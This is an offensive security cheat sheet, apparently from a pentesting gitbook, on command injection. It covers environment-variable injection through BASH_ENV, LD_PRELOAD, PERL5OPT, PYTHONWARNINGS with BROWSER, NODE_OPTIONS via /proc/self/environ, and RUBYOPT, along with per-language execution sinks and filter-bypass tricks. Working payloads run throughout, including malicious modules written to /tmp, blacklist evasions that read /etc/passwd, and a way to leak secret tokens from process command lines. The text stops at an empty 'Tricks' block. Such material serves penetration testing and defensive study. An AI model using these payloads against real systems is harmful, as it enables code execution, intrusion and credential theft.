# Environment variables

## BASH_ENV

You can use `BASH_ENV` with bash to achieve a command injection:

```bash
$ BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x06-bash_env)

## BASH_FUNC_*%%

You can use `BASH_FUNC_*%%` to initialize an anonymous function according to the value of the environment variable and give it a name. The following sample adds `myfunc` function to the bash context:

```bash
$ env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'
uid=0(root) gid=0(root) groups=0(root)
```

Moreover, you can override existing functions:

```bash
$ env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x08)

## ENV

When you force the [dash](https://linux.die.net/man/1/dash) to behave interactively, dash will look for `ENV` environment variable and pass it into `read_profile` function:

```c
if ((shinit = lookupvar("ENV")) != NULL && *shinit != '\0') {
    read_profile(shinit);
}
```

`read_profile` will print the `ENV` content:

```bash
$ ENV='$(id 1>&2)' dash -i -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

You can gain the same result with `sh`:

```bash
$ ENV='$(id 1>&2)' sh -i -c "echo hello"
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x03-dash)

## GIT_*

The following `GIT_*` parameters can be used to abuse a git directory:

- [GIT_DIR](https://git-scm.com/book/en/v2/Git-Internals-Environment-Variables) is the location of the `.git` folder
- [GIT_PROXY_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coregitProxy) is used for overriding `core.gitProxy`
- [GIT_SSH_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coresshCommand) is used for overriding `core.sshCommand`
- [GIT_EXTERNAL_DIFF](https://git-scm.com/docs/git-config#Documentation/git-config.txt-diffexternal) is used for overriding `diff.external`
- [GIT_CONFIG*](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITCONFIGCOUNT). Modern versions of Git support setting any config value via `GIT_CONFIG*` environment variables

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection/parameters-injection#abusing-a-git-directory" %}

## LD_PRELOAD

`LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library `libc.so`.

In Linux C, functions can be declared with attributes within the function definition. This is done by adding the desired attributes to the function definition. There are two attributes of interest, [constructor and destructor](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html). A function with the `constructor` attribute will run before the program executes `main()`. For shared objects, this would occur at load time. A function declared with the `destructor` attribute should run once `main()` has returned or `exit()` is called.

{% hint style="info" %}
LD_PRELOAD can be used to override the standard libc calls, check [Abusing LD_PRELOAD for fun and profit](https://www.sweharris.org/post/2017-03-05-ld-preload/)
{% endhint %}

In other words, you can compile a shared library to be invoked at load time and/or before return:

1. Reuse the following code for compiling a shared library:

    {% embed url="https://gist.github.com/0xn3va/cb07cc44c39cf2652bb747b655b0200b" %}

1. Compile the shared library with the next command:

    ```bash
    $ gcc -Wall -O3 -fPIC -shared inject.c -o inject.so
    ```

1. Exploit:

    ```bash
    $ LD_PRELOAD=./inject.so git -v

    [+] Inject.so Loaded!
    [*] PID: 1337
    [*] Process: /usr/bin/git

    Unknown option: -v
    usage: git [--version] [--help] [-C <path>] [-c name=value]
            [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
            [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
            [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
            <command> [<args>]

    [-] Inject.so is being unloaded!
    ```

    ```bash
    $ LD_PRELOAD=./inject.so id

    [+] Inject.so Loaded!
    [*] PID: 1337
    [*] Process: /usr/bin/id

    uid=0(root) gid=0(root) groups=0(root)
    ```

    ```bash
    $ LD_PRELOAD=./inject.so bash -c "echo 'hello'"

    [+] Inject.so Loaded!
    [*] PID: 1337
    [*] Process: /bin/bash

    hello

    [-] Inject.so is being unloaded!
    ```

References:
- [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/02/ld_preload-how-to-run-code-at-load-time.html)
- [elttam Blog: Remote LD_PRELOAD Exploitation](https://www.elttam.com/blog/goahead/)

## PERL5OPT

[PERL5OPT](https://perldoc.perl.org/perlrun#PERL5OPT) specifies command-line options but is restricted to only accepting the options `CDIMTUWdmtw`.

`PERL5OPT=-M` can be used to load a Perl module and add extra code after the module name:

```bash
PERL5OPT='-Mbase;print(`{cmdname,arg1,arg2}`)' perl /dev/null
```

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)

## PERL5DB

[PERL5DB](https://perldoc.perl.org/perlrun#PERL5DB) specifies the command used to load the debugger code. `PERL5DB` is only used when Perl is started with a bare `-d` switch.

```bash
PERL5OPT=-d PERL5DB='system("ls -la");' perl /dev/null
```

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)

## PERLLIB and PERL5LIB

[PERLLIB](https://perldoc.perl.org/perlrun#PERLLIB) and [PERL5LIB](https://perldoc.perl.org/perlrun#PERL5LIB) set a list of directories in which to look for Perl library files before looking in the standard library. If `PERL5LIB` is defined, `PERLLIB` is not used.

`PERLLIB` and `PERL5LIB` can be used to execute arbitrary commands if there is a way to write a malicious Perl module to a file system:

```bash
$ cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("cmdname arg1 arg2");
EOF
$ PERLLIB=/tmp PERL5OPT=-Mroot perl /dev/null
```

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
- [CVE-2016-1531 exploit](https://github.com/HackerFantastic/exploits/blob/979c345959349cb829e473faae9fe040b7290876/cve-2016-1531.sh)

## PYTHONWARNINGS

[PYTHONWARNINGS](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONWARNINGS) is equivalent to specifying the [-W](https://docs.python.org/3/using/cmdline.html#cmdoption-W) option that is used for warning control. The full form of argument is `action:message:category:module:line`.

Warning control triggers the import of an arbitrary Python module if the specified category contains a dot:

```python
# /Lib/warnings.py
# ...
def _getcategory(category):
    if not category:
        return Warning
    if '.' not in category:
        import builtins as m
        klass = category
    else:
        module, _, klass = category.rpartition('.')
        try:
            m = __import__(module, None, None, [klass])
        except ImportError:
            raise _OptionError("invalid module name: %r" % (module,)) from None
# ...
```

`PYTHONWARNINGS` can be used to execute arbitrary commands if there is a way to write a malicious Python module to a file system:

```bash
$ cat > /tmp/exec.py << EOF
import os
os.system("cmdname arg1 arg2")
EOF
$ PYTHONPATH="/tmp" PYTHONWARNINGS=all:0:exec.x:0:0 python3 python /dev/null
```

However, you can use the `antigravity` module from Python’s standard library to run arbitrary commands. Running `import antigravity` will immediately open a browser to the `xkcd` comic that joked that `import antigravity` in Python would grant you the ability to fly. The `antigravity` uses another module from the standard library called `webbrowser` to open a browser. This module checks `PATH` for a large variety of browsers, including `mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx`. It also accepts an environment variable `BROWSER` that can be used to specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the `xkcd` comic URL is the one hard-coded argument for the command:

```bash
$ <BROWSER> https://xkcd.com/353/
```

One way to execute arbitrary commands is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the `perl` binary can not itself be used. This is because the first and only argument is the `xkcd` comic URL. The comic URL argument will cause an error and the process to exit without the `PERL5OPT` environment variable being used.

Fortunately, when Perl is available it is also common to have the default Perl scripts available, such as `perldoc` and `perlthanks`. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the `PERL5OPT` environment variable. This means it is possible to leverage the Perl environment variables to execute commands.

```bash
$ PYTHONWARNINGS=all:0:antigravity.x:0:0 BROWSER=perlthanks PERL5OPT='-Mbase;print(`{cmdname,arg1,arg2}`);' python3 python /dev/null
```

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)

## NODE_OPTIONS

[NODE_OPTIONS](https://nodejs.org/api/cli.html#node_optionsoptions) specifies a space-separated list of command-line options.

`NODE_OPTIONS` can be used to execute arbitrary commands if there is a way to write a malicious Node.js module to a file system:

```bash
$ cat > /tmp/exec << EOF
console.log(require("child_process").execSync("id").toString());
EOF
$ NODE_OPTIONS='--require /tmp/exec' node node /dev/null
```

If there is no way to write a module to a file system you can use the proc filesystem, specifically `/proc/self/environ`, to deliver a payload.

```bash
$ AAAA='console.log(require("child_process").execSync("id").toString());//' NODE_OPTIONS'=--require /proc/self/environ' node node /dev/null
```

However, there are two constraints:

1. Using `/proc/self/environ` is only possible if the content is syntactically valid JavaScript. To do this, you need to be able to create an environment variable and make it appear first in the contents of `/proc/self/environ`.
1. Since the value of the first environment variable ends with a single-line comment `//`, any newlines in other environment variables will cause a syntax error. Using multiline comments `/*` will not solve the problem, as they must be closed to be syntactically valid. In such cases, it is necessary to overwrite the value of the variable that contains the newline character.

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
- [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

## RUBYOPT

`RUBYOPT` specifies command-line options.

`RUBYOPT` can be used to execute arbitrary commands if there is a way to write a malicious Ruby library to a file system. `-r` option causes Ruby to load the library using require but this is limited to files with an extension of `.rb` or `.so`:

```bash
$ cat > /tmp/exec.rb << EOF
puts `cmdname arg1 arg2`
EOF
$ RUBYOPT=-r/tmp/exec.rb ruby /dev/null
```

References:
- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)

# Languages

## Go

```golang
// https://pkg.go.dev/os#StartProcess
// os.StartProcess
var procAttr = os.ProcAttr
os.StartProcess(
    "cmdname",
    []string{"arg1", "arg2"},
    &procAttr,
)

// https://pkg.go.dev/os/exec#Command
// os/exec.Command
exec.Command("cmdname", "arg1", "arg2").Run()

// command line execution
cmd := exec.Command("bash", "-c", "cmdname arg1 arg2")
out, err := cmd.Output()

// https://pkg.go.dev/os/exec#CommandContext
// os/exec.CommandContext
exec.CommandContext(ctx, "cmdname", "arg1", "arg2").Run()

// https://pkg.go.dev/os/exec#Cmd
// os/exec.Cmd
cmd := &exec.Cmd {
    Path: "cmdname",
    Args: []string{ "arg1", "arg2" },
}
cmd.Run();

// https://pkg.go.dev/syscall#Exec
// syscall.Exec
syscall.Exec(
    "cmdname",
    []string{ "arg1", "arg2" },
    os.Environ(),
)

// https://pkg.go.dev/syscall#ForkExec
// syscall.ForkExec (unix only)
var procAttr = os.ProcAttr
syscall.ForkExec(
    "cmdname",
    []string{ "arg1", "arg2" },
    &procAttr,
)

// https://pkg.go.dev/syscall#StartProcess
// syscall.StartProcess
var procAttr = os.ProcAttr
syscall.StartProcess(
    "cmdname",
    []string{ "arg1", "arg2" },
    &procAttr,
)

// https://pkg.go.dev/syscall?GOOS=windows#CreateProcess
// https://pkg.go.dev/syscall?GOOS=windows#CreateProcessAsUser
// syscall.CreateProcess and syscall.CreateProcessAsUser (windows only)
var sI syscall.StartupInfo
var pI syscall.ProcessInformation
cmdline := syscall.UTF16PtrFromString("cmdname arg1 arg2")
syscall.CreateProcess(nil, cmdline, nil, nil, true, 0, nil, nil, &sI, &pI)
```

## Java

```java
// https://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html
// java.lang.Runtime.exec
Runtime.getRuntime().exec("cmdname arg1 arg2");
Runtime.getRuntime().exec(new String[] {"cmdname", "arg1", "arg2"})
// or full path
java.lang.Runtime.getRuntime().exec("cmdname arg1 arg2");

// https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html
// java.lang.ProcessBuilder
new ProcessBuilder("cmdname", "arg1", "arg2").start();
new ProcessBuilder(new String[]{"cmdname", "arg1", "arg2"}).start();
// or using command
ProcessBuilder pb = new ProcessBuilder();
pb.command("cmdname", "arg1", "arg2").start();
pb.command(new String[]{"cmdname", "arg1", "arg2"}).start();
// or full path
new java.lang.ProcessBuilder("cmdname", "arg1", "arg2").start();

// https://commons.apache.org/proper/commons-exec/apidocs/org/apache/commons/exec/Executor.html
// org.apache.commons.exec.Executor
Executor exec = new DefaultExecutor();
exec.execute(new CommandLine("cmdname arg1 arg2"););

// javax.script.ScriptEngine eval
new ScriptEngineManager()
    .getEngineByExtension("js")
    .eval("js code here");

// java.lang.Runtime loadLibrary
Runtime.getRuntime().loadLibrary("path to library here");
java.lang.Runtime.getRuntime().loadLibrary("path to library here");

// https://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyShell.html
// groovy.lang.GroovyShell
GroovyShell shell = new GroovyShell();
shell.evaluate(...);
shell.parse(...);
shell.parseClass(...);
```

## Node.js

```javascript
// child_process or mz/child_process

// https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
// child_process.exec
const { exec } = require('child_process');
exec('cmdname arg1 arg2');
exec('...', { 'shell': '/path/to/controlled/executable/file' });

// https://nodejs.org/api/child_process.html#child_processexecsynccommand-options
// child_process.execSync
const { execSync } = require('child_process');
execSync('cmdname arg1 arg2');
execSync('...', { 'shell': '/path/to/controlled/executable/file' });

// https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback
// child_process.execFile
const { execFile } = require('child_process');
execFile('cmdname', ['arg1', 'arg2'], (error, stdout, stderr) => { /* ... */ });

// https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options
// child_process.execFileSync
const { execFileSync } = require('child_process');
execFileSync('cmdname', ['arg1', 'arg2'], (error, stdout, stderr) => { /* ... */ });

// https://nodejs.org/api/child_process.html#child_processspawncommand-args-options
// child_process.spawn
const { spawn } = require('child_process');
spawn('cmdname', ['arg1', 'arg2']);
spawn('cmdname arg1 arg2', { shell: true });

// https://nodejs.org/api/child_process.html#child_processspawnsynccommand-args-options
// child_process.spawnSync
const { spawnSync } = require('child_process');
spawnSync('cmdname', ['arg1', 'arg2']);
spawnSync('cmdname arg1 arg2', { shell: true });

// https://www.npmjs.com/package/shelljs
// shelljs.exec
var shell = require('shelljs');
shell.exec('cmdname arg1 arg2');

// https://www.npmjs.com/package/cross-spawn
// cross-spawn.spawn
const spawn = require('cross-spawn');
spawn('cmdname', ['arg1', 'arg2']);
spawn.sync('cmdname', ['arg1', 'arg2']);

// https://www.npmjs.com/package/execa
// execa

// https://github.com/sindresorhus/execa#execafile-arguments-options
// execa.execa
import { execa } from 'execa';
execa.execa('cmdname', ['arg1', 'arg2']);

// https://github.com/sindresorhus/execa#execasyncfile-arguments-options
// execa.execaSync
import { execaSync } from 'execa';
execa.execaSync('cmdname', ['arg1', 'arg2']);

// https://github.com/sindresorhus/execa#command
// execa.$`command`
import { $ } from 'execa';
$`cmdname arg1 arg2`;

// https://github.com/sindresorhus/execa#synccommand
// execa.$.sync`command`
import { $ } from 'execa';
$.sync`cmdname arg1 arg2`

// https://github.com/sindresorhus/execa#execacommandcommand-options
// execa.execaCommand
execa.execaCommand('cmdname arg1 arg2')

// https://github.com/sindresorhus/execa#execacommandsynccommand-options
// execa.execaCommandSync
execa.execaCommandSync('cmdname arg1 arg2')
```

## Python

```python
# https://docs.python.org/3/library/os.html#os.system
# os.system
os.system("cmdname arg1 arg2")

# https://docs.python.org/3/library/os.html#os.popen
# os.popen
os.popen("cmdname arg1 arg2")

# https://docs.python.org/2.7/library/os.html#os.popen2
# Deprecated, available in Python <= 2.7
# os.popen2, os.popen3, os.popen4
os.popen2("cmdname arg1 arg2")

# https://docs.python.org/3/library/os.html#os.spawnl
# os.spawn*
os.spawnl(mode, "path", "arg1", "arg2")
os.spawnle(mode, "path", "arg1", "arg2", os.environ)
os.spawnlp(mode, "file", "arg1", "arg2")
os.spawnlpe(mode, "file", "arg1", "arg2", os.environ)
os.spawnv(mode, "path", ["arg1", "arg2"])
os.spawnve(mode, "path", ["arg1", "arg2"], os.environ)
os.spawnvp(mode, "file", ["arg1", "arg2"])
os.spawnvpe(mode, "file", ["arg1", "arg2"], os.environ)

# https://docs.python.org/3/library/os.html#os.execl
# os.exec*
os.execl("path", "arg1", "arg2")
os.execle("path", "arg1", "arg2", os.environ)
os.execlp("file", "arg1", "arg2")
os.execlpe("file", "arg1", "arg2", os.environ)
os.execv("path", ["arg1", "arg2"])
os.execve("path", ["arg1", "arg2"], os.environ)
os.execvp("file", ["arg1", "arg2"])
os.execvpe("file", ["arg1", "arg2"], os.environ)

# https://docs.python.org/3/library/os.html#os.posix_spawn
# os.posix_spawn
os.posix_spawn("path", ["arg1", "arg2"], os.environ)

# https://docs.python.org/3/library/os.html#os.posix_spawnp
# os.posix_spawnp
os.posix_spawn("path", ["arg1", "arg2"], os.environ)

# https://docs.python.org/3/library/subprocess.html#subprocess.call
# subprocess.call
subprocess.call("cmdname arg1 arg2", shell=True)
subprocess.call(["cmdname", "arg1", "arg2"])

# https://docs.python.org/3/library/subprocess.html#subprocess.run
# subprocess.run
subprocess.run("cmdname arg1 arg2", shell=True)
subprocess.run(["cmdname", "arg1", "arg2"])

# https://docs.python.org/3/library/subprocess.html#subprocess.Popen
# subprocess.Popen
subprocess.Popen("cmdname arg1 arg2", shell=True)
subprocess.Popen(["cmdname", "arg1", "arg2"])

# https://docs.python.org/3/library/subprocess.html#subprocess.check_call
# subprocess.check_call
subprocess.check_call("cmdname arg1 arg2", shell=True)
subprocess.check_call(["cmdname", "arg1", "arg2"])

# https://docs.python.org/3/library/subprocess.html#subprocess.check_output
# subprocess.check_output
subprocess.check_output("cmdname arg1 arg2", shell=True)
subprocess.check_output(["cmdname", "arg1", "arg2"])

# https://docs.python.org/3/library/subprocess.html#subprocess.getoutput
# subprocess.getoutput
subprocess.getoutput("cmdname arg1 arg2")

# https://docs.python.org/3/library/subprocess.html#subprocess.getstatusoutput
# subprocess.getstatusoutput
subprocess.getstatusoutput("cmdname arg1 arg2")

# https://docs.python.org/2.7/library/popen2.html#module-popen2
# Deprecated, available in Python <= 2.7
# popen2.popen2, popen2.popen3, popen2.popen4, popen2.Popen3, popen2.Popen4
popen2.popen2("cmdname arg1 arg2")
popen2.Popen3("cmdname arg1 arg2")

# https://docs.python.org/2.7/library/platform.html#platform.popen
# Deprecated, available in Python <= 2.7
platform.popen("cmdname arg1 arg2")
```

## Ruby

```ruby
# backticks
`cmdname arg1 arg2`

# %x command
%x cmdname ;
# %x<CHAR>command<CHAR>
%x(cmdname arg1 arg2)
%x[cmdname arg1 arg2]
%x|cmdname arg1 arg2|
%x{cmdname arg1 arg2}
%x/cmdname arg1 arg2/
%x"cmdname arg1 arg2"
# ...

# shell heredoc
<<`EOF`
cmdname arg1 arg2
EOF

# https://ruby-doc.org/3.2.1/Kernel.html#method-i-exec
# Kernel.exec
exec("cmdname arg1 arg2")
exec(["cmdname", "argv0"], "arg1", "arg2")
exec("cmdname", "arg1", "arg2")
# or
Kernel.exec("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/Kernel.html#method-i-system
# Kernel.system
system("cmdname arg1 arg2")
system(["cmdname", "argv0"], "arg1", "arg2")
system("cmdname", "arg1", "arg2")
# or
Kernel.system("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/Kernel.html#method-i-spawn
# Kernel.spawn
spawn("cmdname arg1 arg2")
spawn(["cmdname", "argv0"], "arg1", "arg2")
spawn("cmdname", "arg1", "arg2")
# or
Kernel.system("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/Kernel.html#method-i-open
# Kernel.open
open("| cmdname arg1 arg2")
# or
Kernel.open("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/Process.html#method-c-spawn
# Process.spawn
Process.spawn("cmdname arg1 arg2")
Process.spawn(["cmdname", "argv0"], "arg1", "arg2")
Process.spawn("cmdname", "arg1", "arg2")

# https://ruby-doc.org/3.2.1/Process.html#method-c-exec
# Process.exec
Process.exec("cmdname arg1 arg2")
Process.exec(["cmdname", "argv0"], "arg1", "arg2")
Process.exec("cmdname", "arg1", "arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-popen
# IO.popen
IO.popen("cmdname arg1 arg2")
IO.popen(["cmdname", "arg1", "arg2"])
IO.popen([["cmdname", "argv0"], "arg1", "arg2"])

# https://ruby-doc.org/3.2.1/IO.html#method-c-read
# IO.read
IO.read("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-write
# IO.write
IO.write("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-binread
# IO.binread
IO.binread("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-binwrite
# IO.binwrite
IO.binwrite("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-foreach
# IO.foreach
IO.foreach("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/IO.html#method-c-readlines
# IO.readlines
IO.readlines("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-capture2
# Open3.capture2
Open3.capture2("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-capture2e
# Open3.capture2e
Open3.capture2e("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-capture3
# Open3.capture3
Open3.capture3("cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-popen2
# Open3.popen2
Open3.popen2("cmdname arg1 arg2")
Open3.popen2(["cmdname", "arg1", "arg2"])
Open3.popen2([["cmdname", "argv0"], "arg1", "arg2"])

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-popen2e
# Open3.popen2e
Open3.popen2e("cmdname arg1 arg2")
Open3.popen2e(["cmdname", "arg1", "arg2"])
Open3.popen2e([["cmdname", "argv0"], "arg1", "arg2"])

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-popen3
# Open3.popen3
Open3.popen3("cmdname arg1 arg2")
Open3.popen3(["cmdname", "arg1", "arg2"])
Open3.popen3([["cmdname", "argv0"], "arg1", "arg2"])

# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-pipeline
# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-pipeline_r
# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-pipeline_rw
# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-pipeline_start
# https://ruby-doc.org/3.2.1/stdlibs/open3/Open3.html#method-c-pipeline_w
# Open3.pipeline(_r/_w/_rw/_start)
Open3.pipeline("cmdname arg1 arg2", "cmdname arg1 arg2")
Open3.pipeline(["cmdname", "arg1", "arg2"], "cmdname arg1 arg2")
Open3.pipeline([["cmdname", "argv0"], "arg1", "arg2"], "cmdname arg1 arg2")

# https://ruby-doc.org/stdlib-2.5.1/libdoc/open-uri/rdoc/OpenURI.html
# URI.open
# Reference: https://sakurity.com/blog/2015/02/28/openuri.html
require "open-uri"
URI.open("| cmdname arg1 arg2")

# https://ruby-doc.org/3.2.1/Object.html#method-i-send
# https://ruby-doc.org/3.2.1/Object.html#method-i-public_send
# Reference: https://bishopfox.com/blog/ruby-vulnerabilities-exploits
# Object.send, Object.public_send
1.send("eval", "`cmdname arg1 arg2`")
"".send("eval", "`cmdname arg1 arg2`")
o.send("method", "args")
```

# Linux files

## /etc/environment

[/etc/environment](https://man7.org/linux/man-pages/man7/environ.7.html) contains environment variables specifying the basic environment variables for new shells. However, it can be used by other programs. Every executed job in the Linux task scheduler (cron) imports this file, and if there is a job that is executed by a user (e.g. root), you can abuse `/etc/environment` to execute arbitrary code on behalf of that user. For example, you can use [LD_PRELOAD](#ld_preload) to gain code execution.

References:
- [FabricScape: Escaping Service Fabric and Taking Over the Cluster](https://unit42.paloaltonetworks.com/fabricscape-cve-2022-30137/)

# Tips

## Brace expansion

Brace expansion is a mechanism by which arbitrary strings may be generated. Patterns to be brace expanded take the form of an optional preamble, followed by either a series of comma-separated strings or a sequence expression between a pair of braces, followed by an optional postscript. The preamble is prefixed to each string contained within the braces, and the postscript is then appended to each resulting string, expanding left to right. For instance:

```bash
$ echo a{d,c,b}e
ade ace abe
```

You can use brace expansion to create payloads:

```bash
$ {cat,/etc/passwd}
```

References:
- [Bash Reference Manual: 3.5.1 Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)

## Command substitution

Command substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed as follows:

```bash
$(command)
`command`
```

Bash performs the expansion by executing the command in a subshell environment and replacing the command substitution with the standard output of the command.

References:
- [Bash Reference Manual: 3.5.4 Command Substitution](https://www.gnu.org/software/bash/manual/bash.html#Command-Substitution)

## Characters encoding

There are several ways to work with encoded strings:

1. `$'string'` words:

    Words of the form `$'string'` are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard.

    ```bash
    $ a=$'\x74\x65\x73\x74'; echo $a
    $ a=$'\164\145\163\164'; echo $a
    $ a=$'\u0074\u0065\u0073\u0074'; echo $a
    $ a=$'\U00000074\U00000065\U00000073\U00000074'; echo $a
    ```

2. `echo` command:

    `echo` provides `-e` option to interpret backslash escapes. Note the recognized sequences depend on a version of `echo`, as well as the `-e` option may not be present at all.

    ```bash
    echo -e "\x74\x65\x73\x74"
    echo -e "\0164\0145\0163\0164"
    ```

3. `xxd` command:

    ```bash
    $ xxd -r -p <<< 74657374
    $ xxd -r -ps <(echo 74657374)
    ```

References:
- [Bash Reference Manual: 3.1.2.4 ANSI-C Quoting](https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting)
- [echo man page](https://linux.die.net/man/1/echo)
- [xxd man page](https://linux.die.net/man/1/xxd)

## Leak command line arguments

If you have parameter injection in a cli command that has been passed sensitive parameters, such as tokens or passwords, you can try to leak the passed secret with `ps x -w`.

```bash
# you can inject arbitrary parameters to <injection here> part
$ command --user username --token SECRET_TOKEN <injection here>
# send the vulnerable command to background with &
# and catch the parameters with ps x -w
$ command --user username --token SECRET_TOKEN & ps x -w

    PID TTY      STAT   TIME COMMAND
   1337 ?        S      0:00 /usr/bin/command --user username --token SECRET_TOKEN
   1574 ?        R      0:00 ps x -w
```


This can be useful if the cli logs hide sensitive settings or sensitive data is not stored in the environment. 

This can be useful if the cli logs hide sensitive data or sensitive data is not stored in the environment (for instance, GitHub Actions provide variable interpolation `${{...}}` for injecting secrets, and you can't give access to secrets during execution). Another case is when you have blind injection and can redirect the output of `ps x -w` to a file that you have access to.

## List of commands

Combine the execution of multiple commands using the operators `;`, `&`, `&&`, or `||`, and optionally terminated by one of `;`, `&`, or `\n`.

```bash
$ command1; command2
$ command1 & command2
$ command1 && command2
$ command1 || command2 # only if command1 fail
$ command1\ncommand2
```

Moreover, you can use pipelines for the same purposes:

```bash
$ command1 | command2 
$ command1 |& command2 
```

References:
- [Bash Reference Manual: 3.2.3 Pipelines](https://www.gnu.org/software/bash/manual/bash.html#Pipelines)
- [Bash Reference Manual: 3.2.4 Lists of Commands](https://www.gnu.org/software/bash/manual/bash.html#Lists)

## Producing slash with tr

```bash
$ echo . | tr '!-0' '"-1'
$ tr '!-0' '"-1' <<< .
$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## Redirections

Redirect input and output before a command will be executed using the operators `>`, `>|`, `>>`, `<`, and etc.

```bash
$ ls > dirlist 2>&1
$ cat</etc/passwd
```

Supply a single string with a newline appended using the operator `<<<`.

```bash
$ base64 -d <<< dGVzdA==
```

References:
- [Bash Reference Manual: 3.6 Redirections](https://www.gnu.org/software/bash/manual/bash.html#Redirections)

## Shell parameter expansion

The basic form of parameter expansion is `${parameter}`; the value of the parameter is substituted:

```bash
$ a="es"; echo "t${a}t"
```

More complex forms of parameter expansions allow you to perform various operations. For instance, you can extract substrings and use them to create payloads:

```bash
$ echo ${HOME:0:1}
$ cat ${HOME:0:1}etc${HOME:0:1}passwd
```

Additionally, match and replace can be useful when working with blacklists:

```bash
$ a=/eAAA/Atc/paAAA/Asswd; echo ${a//AAA\/A/}
```

References:
- [Bash Reference Manual: 3.5.3 Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion)
- [Bash scripting cheatsheet: Parameter expansions](https://devhints.io/bash#parameter-expansions)

## Special shell parameters

There are several parameters that the shell treats specially. Some of these parameters you can use to create payloads:

```bash
$ i$@d
# $0 expands to the name of the shell or shell script
$ bash -c 'echo id|$0'
```

References:
- [Bash Reference Manual: 3.4.2 Special Parameters](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters)

## Shell variables

Bash automatically assigns default values to many variables, such as `HOME` or `PATH`. Some of these variables can be used to create payloads. For instance, you can use `IFS` variable as a separator (this is possible since `IFS` contains a list of characters that separate fields):

```bash
$ cat$IFS/etc/passwd
$ echo${IFS}"test"
```

Moreover, you can override `IFS` and use any character as a separator:

```bash
$ IFS=,;`cat<<<uname,-a`
```

References:
- [Bash Reference Manual: 5 Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables)
- [Bash Reference Manual: 3.5.7 Word Splitting](https://www.gnu.org/software/bash/manual/bash.html#Word-Splitting)

## Tricks

```bash
